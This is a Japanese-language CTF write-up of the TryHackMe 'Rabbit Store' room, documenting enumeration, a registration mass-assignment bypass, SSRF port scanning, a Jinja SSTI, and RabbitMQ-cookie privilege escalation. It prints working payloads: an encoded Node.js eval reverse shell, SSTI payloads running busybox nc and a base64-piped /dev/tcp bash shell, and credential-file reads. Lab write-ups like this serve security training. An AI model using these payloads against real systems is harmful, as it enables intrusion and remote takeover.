# Rabbit Store CTF

https://tryhackme.com/room/rabbitstore

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.188.236
root@ip-10-10-210-160:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-17 05:50 BST
Nmap scan report for 10.10.188.236
Host is up (0.00013s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
4369/tcp  open  epmd
25672/tcp open  unknown
MAC Address: 02:A5:3E:5C:9E:A1 (Unknown)

root@ip-10-10-210-160:~# sudo nmap -sV -p22,80,4369,25672 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-17 05:50 BST
Nmap scan report for 10.10.188.236
Host is up (0.00012s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.52
4369/tcp  open  epmd    Erlang Port Mapper Daemon
25672/tcp open  unknown
MAC Address: 02:A5:3E:5C:9E:A1 (Unknown)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 135.63 seconds
```

80 ポートにアクセスすると、cloudsite.thm に転送される。/etc/hosts に追加。

login/signup ボタンを押すと、http://storage.cloudsite.thm/ に転送される。

### gobuster

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

root@ip-10-10-210-160:~# gobuster dir -x=txt,php -u http://cloudsite.thm -w ./dirlist.txt -t 30 -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cloudsite.thm
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                ./dirlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 315] [--> http://cloudsite.thm/assets/]
/.htaccess.txt        (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/javascript           (Status: 301) [Size: 319] [--> http://cloudsite.thm/javascript/]
/server-status        (Status: 403) [Size: 278]
Progress: 681570 / 681573 (100.00%)
===============================================================
Finished
===============================================================
```

/javascript の中を探索

```shell
root@ip-10-10-210-160:~# gobuster dir -x=js -u http://cloudsite.thm/javascript -w ./dirlist.txt -t 30 -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cloudsite.thm/javascript
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                ./dirlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/events               (Status: 301) [Size: 326] [--> http://cloudsite.thm/javascript/events/]
/highlight            (Status: 301) [Size: 329] [--> http://cloudsite.thm/javascript/highlight/]
/highlight.js         (Status: 301) [Size: 332] [--> http://cloudsite.thm/javascript/highlight.js/]
/.htaccess            (Status: 403) [Size: 278]
/.htaccess.js         (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htpasswd.js         (Status: 403) [Size: 278]
/jquery               (Status: 301) [Size: 326] [--> http://cloudsite.thm/javascript/jquery/]
/psl                  (Status: 301) [Size: 323] [--> http://cloudsite.thm/javascript/psl/]
Progress: 454380 / 454382 (100.00%)
===============================================================
Finished
===============================================================
```

### サブドメイン検索

```shell
$ ffuf -c -u http://cloudsite.thm -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.cloudsite.thm' -fw 18

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cloudsite.thm
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.cloudsite.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 18
________________________________________________

storage                 [Status: 200, Size: 9039, Words: 3183, Lines: 263, Duration: 263ms]
:: Progress: [4989/4989] :: Job [1/1] :: 156 req/sec :: Duration: [0:00:33] :: Errors: 0 ::
```

storage 以外は見つからず。

storage 配下を gobuster 実行するが、めぼしい結果は無し。

```shell
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 331] [--> http://storage.cloudsite.thm/assets/]
/css                  (Status: 301) [Size: 328] [--> http://storage.cloudsite.thm/css/]
/fonts                (Status: 301) [Size: 330] [--> http://storage.cloudsite.thm/fonts/]
/.htaccess            (Status: 403) [Size: 286]
/.htaccess.txt        (Status: 403) [Size: 286]
/.htaccess.php        (Status: 403) [Size: 286]
/.htpasswd.php        (Status: 403) [Size: 286]
/.htpasswd            (Status: 403) [Size: 286]
/.htpasswd.txt        (Status: 403) [Size: 286]
/images               (Status: 301) [Size: 331] [--> http://storage.cloudsite.thm/images/]
/javascript           (Status: 301) [Size: 335] [--> http://storage.cloudsite.thm/javascript/]
/js                   (Status: 301) [Size: 327] [--> http://storage.cloudsite.thm/js/]
/server-status        (Status: 403) [Size: 286]
Progress: 681570 / 681573 (100.00%)
===============================================================
Finished
===============================================================
```

## ログイン

メールアドレスで普通にユーザー登録は可能。

ただし、ログインすると組織内部向けのサービスだというエラー表示。

```
Sorry, this service is only for internal users working within the organization and our clients. If you are one of our clients, please ask the administrator to activate your subscription.
```

組織の人間っぽく見せるために、thm@cloudsite.thm や thm@smarteyeapps.com というメールアドレスでも登録してみたが、変わらなかった。

Cookie をみると、jwt という名前の JWT トークンが保存されていた。

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRobUBzbWFydGV5ZWFwcHMuY29tIiwic3Vic2NyaXB0aW9uIjoiaW5hY3RpdmUiLCJpYXQiOjE3NDQ4NjY0ODYsImV4cCI6MTc0NDg3MDA4Nn0.-wQQeCw4uZy4iLU8edTuwJZ3grDoodFlMrHqwwaSBAs
```

デコード

```json
{"alg":"HS256","typ":"JWT"}
{
  "email": "thm@smarteyeapps.com",
  "subscription": "inactive",
  "iat": 1744866486,
  "exp": 1744870086
}
```

None アルゴリズムを試す。

```json
{"alg":"None","typ":"JWT"}
{
  "email": "thm@smarteyeapps.com",
  "subscription": "active",
  "iat": 1744866486,
  "exp": 1744870086
}
```

エンコード

```
eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJlbWFpbCI6InRobUBzbWFydGV5ZWFwcHMuY29tIiwic3Vic2NyaXB0aW9uIjoiYWN0aXZlIiwiaWF0IjoxNzQ0ODY3NjQ1LCJleHAiOjE3NDQ4NzEyNDV9.
```

不正トークンと判定された。

```
message	"Invalid token"
```

鍵のクラックを試みたが、割れなかった。

```shell
hashcat -m 16500 jwt.txt rockyou.txt
```

分からないので、ウォークスルーを見た。

答え。ユーザー登録時の Json に "subscription": "active" を追加する。

```http
POST /api/register HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://storage.cloudsite.thm/register.html
Content-Type: application/json
Content-Length: 44
Origin: http://storage.cloudsite.thm
Connection: keep-alive

{
    "email":"aaa@thm.com",
    "password":"abcdefg",
    "subscription": "active"
}
```

なるほど・・・  
かなり難しいが、たしかに、ユーザーテーブルを想像して subscription 列があるとイメージできていれば、こういう脆弱性を想像することも不可能ではなかったかもしれない。

## ファイルアップロード

ファイルアップロード画面が表示されたので、リバースシェルの PHP をアップロードする。

```
Success: Image uploaded successfully

File path: /api/uploads/a4378833-bd5f-4be3-bb39-62de517ab2e2
```

成功したと表示されるが、http://storage.cloudsite.thm/api/uploads/a4378833-bd5f-4be3-bb39-62de517ab2e2 にアクセスしても NotFound と表示される。

「URL からダウンロード」を実行しても同じ。

```
File path: /api/uploads/86470ea0-55f7-4518-bc9f-8386a5ad1445
```

URL からダウンロードを実行したとき、HTTP リクエストは確かに来ている。  
node-fetch が使われているので、そもそも PHP ではなかった。

```shell
$ nc -lvnp 8000
listening on [any] 8000 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.188.236] 45492
GET /pentest.php HTTP/1.1
Accept: */*
User-Agent: node-fetch/1.0 (+https://github.com/bitinn/node-fetch)
Accept-Encoding: gzip,deflate
Host: 10.2.22.182:8000
Connection: close
```

### デシリアライズ攻撃

URL からアップロード時、JSON データを送っている。

```http
POST /api/store-url HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://storage.cloudsite.thm/dashboard/active
Content-Type: application/json
Content-Length: 45
Origin: http://storage.cloudsite.thm
Connection: keep-alive
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFhYUB0aG0uY29tIiwic3Vic2NyaXB0aW9uIjoiYWN0aXZlIiwiaWF0IjoxNzQ0ODcwNDUxLCJleHAiOjE3NDQ4NzQwNTF9.eK0GUNTxOqVFZs7s77JdwdfSVm2D312aAXtn3DglIjo

{"url":"http://10.2.22.182:8000/pentest.php"}
```

この JSON に対して、NodeJS のデシリアライズ攻撃を狙う。

```shell
$ python2 ./nodejsshell.py 10.2.22.182 6666
[+] LHOST = 10.2.22.182
[+] LPORT = 6666
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,50,46,50,50,46,49,56,50,34,59,10,80,79,82,84,61,34,54,54,54,54,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))
```

これを使ってペイロードを送ったが、Bad Request と返ってきて効果が無かった。  
失敗。

### SSRF

ローカルエンドポイントに対して、SSRF を狙う。

```shell
$ ffuf -c -u http://storage.cloudsite.thm/api/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -fs 404

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://storage.cloudsite.thm/api/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 404
________________________________________________

register                [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 321ms]
login                   [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 329ms]
uploads                 [Status: 401, Size: 32, Words: 3, Lines: 1, Duration: 262ms]
docs                    [Status: 403, Size: 27, Words: 2, Lines: 1, Duration: 264ms]
Login                   [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 260ms]
Register                [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 262ms]
Uploads                 [Status: 401, Size: 32, Words: 3, Lines: 1, Duration: 264ms]
Docs                    [Status: 403, Size: 27, Words: 2, Lines: 1, Duration: 263ms]
DOCS                    [Status: 403, Size: 27, Words: 2, Lines: 1, Duration: 264ms]
LogIn                   [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 261ms]
LOGIN                   [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 269ms]
UPLOADS                 [Status: 401, Size: 32, Words: 3, Lines: 1, Duration: 261ms]
DOCs                    [Status: 403, Size: 27, Words: 2, Lines: 1, Duration: 261ms]
UpLoads                 [Status: 401, Size: 32, Words: 3, Lines: 1, Duration: 264ms]
logIn                   [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 269ms]
:: Progress: [119600/119600] :: Job [1/1] :: 150 req/sec :: Duration: [0:13:24] :: Errors: 0 ::
```

未知のエンドポイントとして、/api/docs があるが、403 で攻撃マシンからは見えない状態。

http://storage.cloudsite.thm/api/docs の URL でアップロードボタンを押すと、成功と表示されるが、アクセスすると Not Found となる。

2 回目のギブアップ。

http://127.0.0.1:80/api/docs を指定すると、下記の応答が保存されている。

```html
<!DOCTYPE html PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html>
  <head>
    <title>404 Not Found</title>
  </head>
  <body>
    <h1>Not Found</h1>
    <p>The requested URL was not found on this server.</p>
    <hr />
    <address>Apache/2.4.52 (Ubuntu) Server at cloudsite.thm Port 80</address>
  </body>
</html>
```

https://0xb0b.gitbook.io/writeups/tryhackme/2025/rabbit-store から拝借。

```python
import requests

# Base URL and endpoint
base_url = "http://storage.cloudsite.thm/api/store-url"

# Headers
headers = {
    "Cookie": "jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFhYUB0aG0uY29tIiwic3Vic2NyaXB0aW9uIjoiYWN0aXZlIiwiaWF0IjoxNzQ0ODcyOTEzLCJleHAiOjE3NDQ4NzY1MTN9.2py_-T98_MYGWN8fPg1wY4szZE-UiVeU02-EZWIzKb4",
    "Content-Type": "application/json"
}

# Function to make POST request to a specific port
def make_request(port):
    # URL to test
    test_url = f"http://127.0.0.1:{port}"
    data = {"url": test_url}

    try:
        # Make the POST request
        response = requests.post(base_url, headers=headers, json=data)

        # Check if the response contains a non-empty "path"
        if response.status_code == 200:
            json_response = response.json()
            if "path" in json_response and json_response["path"]:
                print(f"Port: {port}, Path: {json_response['path']}")
    except requests.RequestException as e:
        # Handle potential request errors
        print(f"Error on port {port}: {e}")

# Iterate over a range of ports (1 to 65535)
for port in range(1, 65536):
    make_request(port)
```

時間がかかって全然終わらなかったが、このスクリプトを実行すると、80 ポートと 3000 ポートがオープンしていることが分かる、ということ。

ゲットした docs。

```
Endpoints Perfectly Completed

POST Requests:
/api/register - For registering user
/api/login - For loggin in the user
/api/upload - For uploading files
/api/store-url - For uploadion files via url
/api/fetch_messeges_from_chatbot - Currently, the chatbot is under development. Once development is complete, it will be used in the future.

GET Requests:
/api/uploads/filename - To view the uploaded files
/dashboard/inactive - Dashboard for inactive user
/dashboard/active - Dashboard for active user

Note: All requests to this endpoint are sent in JSON format.
```

/api/fetch_messeges_from_chatbot というエンドポイントがあることが判明する。

## /api/fetch_messeges_from_chatbot

- ブラウザで表示すると、GET は許容されていないと表示される。
- 空の JSON で POST すると、username パラメータが必須と返される。

aaa という username で POST すると下記の応答。

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Greeting</title>
  </head>
  <body>
    <h1>Sorry, aaa, our chatbot server is currently under development.</h1>
  </body>
</html>
```

念のため、ここでもデシリアライズ攻撃を試したが失敗した。

### SSTI

これを送ると、

```json
{
  "username": "{{4*4}}[[5*5]]"
}
```

下記が返った。SSTI の脆弱性があることが分かる。

```html
  <h1>Sorry, 16[[5*5]], our chatbot server is currently under development.</h1>
 </body>
```

Object クラスのサブクラス一覧

```json
{
  "username": "{{\"\".__class__.__mro__[1].__subclasses__()}}"
}
```

この出力を解析すると、`<class '_sitebuiltins._Helper'>` が 140 番目のクラスであることが分かる。

```
（略）
<class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>,
（略）
```

`ls -al` を実行

```json
{
  "username": "{{\"\".__class__.__mro__[1].__subclasses__()[140].__repr__.__globals__.get(\"__builtins__\").get(\"__import__\")(\"subprocess\").check_output([\"ls\", \"-al\"])}}"
}
```

コマンドの出力が表示されている。

```html
<h1>
  Sorry, b&#39;total 20\ndrwxrwxr-x 4 azrael azrael 4096 Aug 16 2024
  .\ndrwx------ 9 azrael azrael 4096 Sep 12 2024 ..\n-rw-rw-r-- 1 azrael azrael
  752 Aug 16 2024 chatbot.py\ndrwxrwxr-x 2 azrael azrael 4096 Jul 18 2024
  __pycache__\ndrwxrwxr-x 2 azrael azrael 4096 Aug 15 2024 templates\n&#39;, our
  chatbot server is currently under development.
</h1>
```

busybox を利用したリバースシェルを実行。

```json
{{\"\".__class__.__mro__[1].__subclasses__()[140].__repr__.__globals__.get(\"__builtins__\").get(\"__import__\")(\"subprocess\").check_output([\"busybox\", \"nc\", \"10.2.22.182\", \"6666\", \"-e\", \"sh\"])}}
```

リバースシェル取得成功！

```shell
$ nc -lvnp 6666
listening on [any] 6666 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.184.120] 50918
id
uid=1000(azrael) gid=1000(azrael) groups=1000(azrael)
```

```shell
ls /home
azrael
ls /home/azrael
chatbotServer
snap
user.txt
cat /home/azrael/user.txt
98..................................
```

ユーザーフラグゲット。

## 権限昇格

- SUID, SGID
- sudo -l
- linpeas

等を探しても特に何も出なかった。

ルームの名前からして、下記のプロセスは非常に気になる。

```shell
azrael@forge:~/.gnupg$ ps -aux | grep rabbit
ps -aux | grep rabbit
rabbitmq    1184  0.5  3.4 2284160 135320 ?      Ssl  06:52   0:54 /usr/lib/erlang/erts-12.2.1/bin/beam.smp -W w -MBas ageffcbf -MHas ageffcbf -MBlmbcs 512 -MHlmbcs 512 -MMmcs 30 -P 1048576 -t 5000000 -stbt db -zdbbl 128000 -sbwt none -sbwtdcpu none -sbwtdio none -- -root /usr/lib/erlang -progname erl -- -home /var/lib/rabbitmq -- -pa  -noshell -noinput -s rabbit boot -boot start_sasl -syslog logger [] -syslog syslog_error_logger false
rabbitmq    1195  0.0  0.0   2780  1580 ?        Ss   06:52   0:00 erl_child_setup 65536
rabbitmq    1258  0.0  0.0   3740  1200 ?        Ss   06:52   0:00 inet_gethost 4
rabbitmq    1259  0.0  0.0   3740   104 ?        S    06:52   0:00 inet_gethost 4
root        1290  0.0  1.0 690560 42756 ?        Ssl  06:53   0:00 /usr/bin/node /root/forge_web_service/rabbitmq/worker.js
azrael     34053  0.0  0.0   6480  2348 pts/0    S+   09:40   0:00 grep --color=auto rabbit
```

`/root/forge_web_service/rabbitmq/worker.js` の中身は不明だが、あからさまに怪しい。

Web サービスのようなので、Listen しているポートを調べる。

```shell
azrael@forge:~/.gnupg$ netstat -nplt
netstat -nplt
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:15672         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:5672          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      603/python3
tcp        0      0 0.0.0.0:25672           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::4369                 :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
```

RabbitMQ について調べ、CTF における定石は次のとおりと理解した。

1. Cookie を入手
1. 設定をエクスポート（パスワードハッシュが含まれる）
1. パスワードをオフラインクラック

### Cookie を入手

Cookie が（不自然に）読める。

```shell
azrael@forge:~/chatbotServer$ ls -al /var/lib/rabbitmq
total 896
drwxr-xr-x  5 rabbitmq rabbitmq   4096 Sep 12  2024 .
drwxr-xr-x 45 root     root       4096 Sep 20  2024 ..
drwxr-x---  3 rabbitmq rabbitmq   4096 Aug 15  2024 config
-r-----r--  1 rabbitmq rabbitmq     16 Apr 17 11:33 .erlang.cookie
-rw-r-----  1 rabbitmq rabbitmq 889362 Apr 17 11:33 erl_crash.dump
drwxr-x---  4 rabbitmq rabbitmq   4096 Apr 17 11:33 mnesia
-rw-r-----  1 rabbitmq rabbitmq      0 Sep 12  2024 nc
drwxr-x---  2 rabbitmq rabbitmq   4096 Jul 18  2024 schema
```

```shell
azrael@forge:~/chatbotServer$ cat /var/lib/rabbitmq/.erlang.cookie
L4cp2EA6qNc7OToh
```

### 設定をエクスポート

```shell
$ sudo rabbitmqctl --erlang-cookie 'L4cp2EA6qNc7OToh' --node rabbit@forge export_definitions ./definitions.json
Exporting definitions in JSON to a file at "./definitions.json" ...
Stack trace:

** (UndefinedFunctionError) function JSON.encode/1 is undefined or private
    (elixir 1.18.1) JSON.encode(%{permissions: [%{"configure" => ".*", "read" => ".*", "user" => "root", "vhost" => "/", "write" => ".*"}], bindings: [], queues: [%{"arguments" => %{}, "auto_delete" => false, "durable" => true, "name" => "tasks", "type" => :classic, "vhost" => "/"}], parameters: [], policies: [], rabbitmq_version: "3.9.13", exchanges: [], global_parameters: [%{"name" => :cluster_name, "value" => "rabbit@forge"}], rabbit_version: "3.9.13", topic_permissions: [%{"exchange" => "", "read" => ".*", "user" => "root", "vhost" => "/", "write" => ".*"}], users: [%{"hashing_algorithm" => :rabbit_password_hashing_sha256, "limits" => %{}, "name" => "The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.", "password_hash" => "vyf4qvKLpShONYgEiNc6xT/5rLq+23A2RuuhEZ8N10kyN34K", "tags" => []}, %{"hashing_algorithm" => :rabbit_password_hashing_sha256, "limits" => %{}, "name" => "root", "password_hash" => "49e[REDACTED]BzWF", "tags" => ["administrator"]}], vhosts: [%{"limits" => [], "metadata" => %{description: "Default virtual host", tags: []}, "name" => "/"}]})
    (rabbitmqctl 4.0.0-dev) lib/rabbitmq/cli/ctl/commands/export_definitions_command.ex:154: RabbitMQ.CLI.Ctl.Commands.ExportDefinitionsCommand.serialise/2
    (rabbitmqctl 4.0.0-dev) lib/rabbitmq/cli/ctl/commands/export_definitions_command.ex:76: RabbitMQ.CLI.Ctl.Commands.ExportDefinitionsCommand.run/2
    (rabbitmqctl 4.0.0-dev) lib/rabbitmqctl.ex:174: RabbitMQCtl.maybe_run_command/3
    (rabbitmqctl 4.0.0-dev) lib/rabbitmqctl.ex:142: anonymous fn/5 in RabbitMQCtl.do_exec_parsed_command/5
    (rabbitmqctl 4.0.0-dev) lib/rabbitmqctl.ex:642: RabbitMQCtl.maybe_with_distribution/3
    (rabbitmqctl 4.0.0-dev) lib/rabbitmqctl.ex:107: RabbitMQCtl.exec_command/2
    (rabbitmqctl 4.0.0-dev) lib/rabbitmqctl.ex:41: RabbitMQCtl.main/1

Error:
:undef
```

何故かエラーが発生したが、ハッシュがギリギリ出ていたのでこれを使う。

```
{"hashing_algorithm" => :rabbit_password_hashing_sha256, "limits" => %{}, "name" => "root", "password_hash" => "49e[REDACTED]BzWF"
```

Sha256+Salt の形に変換する。

```shell
$ echo -n '49e[REDACTED]BzWF' | base64 -d | xxd -p -c 100 | awk '{print substr($0, 9) ":" substr($0, 1, 8)}'
295d[REDACTED]585:e3d7ba85
```

クラックを試みたが、割れなかった。

```shell
hashcat -m 1410 -a 0 hash.txt .\SecLists\Passwords\Common-Credentials\10-million-password-list-top-1000000.txt
```

ハッシュをそのままパスワードとしたら root になれた・・・。

```shell
azrael@forge:~$ su -
Password:
root@forge:~# id
uid=0(root) gid=0(root) groups=0(root)
```

```shell
root@forge:~# cat /root/root.txt
ea...................................
```

ルートフラグゲット。

## 振り返り

- 認証バイパス、SSRF、SSTI、RabbitMQ。全てが難しかった。自力でクリアできたのは SSTI だけ。
- JWT に含まれる項目は、ユーザーテーブルの列名かもしれない。登録データとして送信したらそれがそのまま保存されるかもしれない。
- /api の下だけ内部的に別のポートに割り当てられていて SSRF でのスキャンが必要という構成は、よくありそうでいて、個人的にはたぶん初見。最初、PHP をアップロードしたときに NotFound が返ったときと動作が同じだったこともあって看破できなかった。
- SSTI でリバースシェルを取るところでは、こういう方法もあったらしい。インデックスを手動で探さなくても良い点も優れているが、Base64 文字列をパイプでデコードし、bash に渡す方法も参考になる。

```shell
{{request.application.__globals__.__builtins__.__import__('os').popen('echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjE0LjkwLjIzNS80NDQ1IDA+JjE=|base64 -d|bash').read()}}
```

- RabbitMQ については、完全に初見。別途独立したページとしてまとめた。（RabbitMQ.md）
- ハッシュ値をクラックするのかと思いきや、そのまま root のパスワードとして使うパターン。
